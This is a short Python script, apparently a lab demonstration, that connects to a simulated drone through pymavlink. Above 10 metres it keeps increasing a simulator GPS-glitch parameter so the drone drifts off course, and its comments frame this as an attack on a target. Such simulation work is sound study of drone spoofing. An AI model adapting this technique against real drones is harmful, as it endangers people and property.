import time
from pymavlink import mavutil

# Connect to the Drone on port 14551
print("--- Searching for target drone on port 14551 ---")
master = mavutil.mavlink_connection('udpin:127.0.0.1:14551')
master.wait_heartbeat()
print(f"--- TARGET DETECTED: System {master.target_system} ---")

# Variable to accumulate the GPS offset (starts at 0)
glitch_offset = 0.0

# Define the "drift speed" (how fast the drone will fly away)
DRIFT_SPEED = 0.00001 

while True:
    # Read the drone's position message
    msg = master.recv_match(type='GLOBAL_POSITION_INT', blocking=True)
    
    if msg:
        altitude = msg.relative_alt / 1000.0
        # Print status on the same line to keep terminal clean
        print(f"Altitude: {altitude:.1f}m | Current GPS Offset: {glitch_offset:.6f}", end="\r")

        # Only attack if the drone is above 10 meters
        if altitude > 10:
            
            # CONTINUOUSLY INCREASE THE OFFSET
            glitch_offset += DRIFT_SPEED
            
            # Send the new fake GPS coordinate (Latitude Glitch)
            master.mav.param_set_send(
                master.target_system,
                master.target_component,
                b'SIM_GPS_GLITCH_Y',  # Parameter to fake Latitude
                glitch_offset,        # The ever-increasing fake value
                mavutil.mavlink.MAV_PARAM_TYPE_REAL32
            )

    # Runs 10 times per second (0.1s)
    time.sleep(0.1)